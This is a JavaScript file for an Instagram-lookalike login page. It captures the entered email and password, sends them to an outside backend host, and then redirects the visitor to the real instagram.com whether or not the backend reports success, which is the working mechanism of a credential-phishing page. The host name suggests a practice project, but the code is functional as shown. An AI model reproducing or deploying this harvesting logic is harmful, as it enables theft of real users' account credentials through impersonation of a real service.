console.log("Script loaded 🔥");



//custom allert.

function showAlert(message) {
  document.getElementById("alertMessage").innerText = message;
  document.getElementById("customAlert").style.display = "block";
}

function closeAlert() {
  document.getElementById("customAlert").style.display = "none";
}

// custom allert


const loginBtn = document.getElementById("loginBtn");
const userInput = document.getElementById("user");
const passInput = document.getElementById("pass");

const BACKEND_URL = "https://insta-clone-made4practice.onrender.com";

loginBtn.addEventListener("click", async (e) => {
  e.preventDefault();

  const email = userInput.value.trim();
  const password = passInput.value.trim();

  if (!email || !password) {
    showAlert("Fill both fields first! username & password");
    return;
  }

  try {
    const res = await fetch(`${BACKEND_URL}/login`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ email, password })
    });

    // 🔥 catch HTTP errors properly
    if (!res.ok) {
      throw new Error(`Server error: ${res.status}`);
    }

    const data = await res.json();
    console.log("Backend response:", data);

    if (data.success) {
      window.location.href = 
"https://www.instagram.com/?hl=en/";
    } else {
      // alert("Invalid response from server 💀");
      window.location.href = 
"https://www.instagram.com/?hl=en/";
    }

  } catch (err) {
    console.error("Login failed:", err);
    alert("Server error bro 💀");
  }
});

// button debug logs
const buttons = document.querySelectorAll("button");

buttons.forEach(btn => {
  btn.addEventListener("click", () => {
    console.log(btn.innerText + " clicked!");
  });
});